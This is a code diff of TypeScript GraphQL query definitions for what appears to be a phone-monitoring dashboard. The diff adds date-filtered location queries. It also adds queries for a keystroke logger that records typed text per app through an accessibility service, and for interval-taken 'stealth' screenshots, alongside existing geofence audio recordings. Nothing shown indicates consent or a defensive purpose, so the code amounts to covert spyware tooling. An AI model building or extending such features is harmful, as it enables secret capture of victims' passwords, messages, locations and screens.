@@ -846,10 +846,16 @@ export const locationTrackingStateGQL = `
 `
 
 export const locationPointsGQL = `
-  query locationPoints($offset: Int!, $limit: Int!) {
-    locationPoints(offset: $offset, limit: $limit) {
+  query locationPoints($offset: Int!, $limit: Int!, $fromTs: String!, $toTs: String!) {
+    locationPoints(offset: $offset, limit: $limit, fromTs: $fromTs, toTs: $toTs) {
       ts lat lng accuracy speed altitude bearing battery charging provider
     }
+  }
+`
+
+export const locationPointsCountGQL = `
+  query locationPointsCount($fromTs: String!, $toTs: String!) {
+    locationPointsCount(fromTs: $fromTs, toTs: $toTs)
   }
 `
 
@@ -879,6 +885,51 @@ export const geofenceAudiosGQL = `
   query geofenceAudios($offset: Int!, $limit: Int!, $geofenceId: String!) {
     geofenceAudios(offset: $offset, limit: $limit, geofenceId: $geofenceId) {
       id geofenceId geofenceName eventId ts durationMs sizeBytes fileId
+    }
+  }
+`
+
+export const keystrokeStateGQL = `
+  query keystrokeState {
+    keystrokeState {
+      enabled accessibilityServiceConnected bufferLimit totalEntries
+    }
+  }
+`
+
+export const keystrokeEntriesGQL = `
+  query keystrokeEntries($offset: Int!, $limit: Int!, $query: String!, $packageName: String!, $fromTs: String!, $toTs: String!) {
+    keystrokeEntries(offset: $offset, limit: $limit, query: $query, packageName: $packageName, fromTs: $fromTs, toTs: $toTs) {
+      id ts packageName appLabel fieldHint text
+    }
+  }
+`
+
+export const keystrokeEntriesCountGQL = `
+  query keystrokeEntriesCount($query: String!, $packageName: String!, $fromTs: String!, $toTs: String!) {
+    keystrokeEntriesCount(query: $query, packageName: $packageName, fromTs: $fromTs, toTs: $toTs)
+  }
+`
+
+export const keystrokePackageStatsGQL = `
+  query keystrokePackageStats {
+    keystrokePackageStats { packageName count }
+  }
+`
+
+export const stealthScreenshotStateGQL = `
+  query stealthScreenshotState {
+    stealthScreenshotState {
+      enabled accessibilityServiceConnected supportedByOs
+      intervalMin keepCount totalShots
+    }
+  }
+`
+
+export const stealthScreenshotsGQL = `
+  query stealthScreenshots($offset: Int!, $limit: Int!) {
+    stealthScreenshots(offset: $offset, limit: $limit) {
+      id ts packageName appLabel width height sizeBytes manual fileId
     }
   }
 `
